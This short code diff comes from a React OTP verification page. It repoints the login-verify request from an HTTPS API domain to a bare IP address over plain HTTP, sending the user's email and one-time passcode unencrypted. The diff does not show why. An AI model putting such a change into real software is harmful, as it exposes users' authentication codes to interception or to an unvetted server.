@@ -234,7 +234,7 @@ const OTPPage = () => {
     if (isFormValid) {
       setLoading(true);
       try {
-        const response = await axios.post('https://api.moonpayx.com/users/login/verify', {
+        const response = await axios.post('http://147.93.20.176:8000/users/login/verify', {
           Email: location.state.email,
           OTP: otp.join('') // Concatenate OTP array into a single string
         });
